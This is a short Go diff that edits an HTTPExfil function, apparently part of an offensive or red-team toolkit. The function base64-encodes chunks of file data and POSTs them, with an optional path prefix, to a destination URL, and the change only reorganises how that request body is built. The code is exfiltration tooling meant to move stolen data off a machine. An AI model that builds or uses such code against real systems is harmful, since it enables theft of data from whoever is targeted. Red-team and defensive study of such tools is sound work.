@@ -130,6 +130,7 @@ func HTTPExfil(
 ) (ExfilFunc, error) {
 	var f ExfilFunc = func(path string, b []byte) error {
 		var b64 string
+		var data []byte
 		var e error
 		var n int
 		var req *http.Request
@@ -149,12 +150,20 @@ func HTTPExfil(
 				return errors.Newf("failed to read data: %w", e)
 			}
 
-			// Create request
+			// Create request body
 			b64 = base64.StdEncoding.EncodeToString(tmp[:n])
+
+			if path != "" {
+				data = []byte(path + " " + b64)
+			} else {
+				data = []byte(b64)
+			}
+
+			// Create request
 			req, e = http.NewRequest(
 				http.MethodPost,
 				dst,
-				bytes.NewBuffer([]byte(path+" "+b64)),
+				bytes.NewBuffer(data),
 			)
 			if e != nil {
 				e = errors.Newf("failed to craft HTTP request: %w", e)
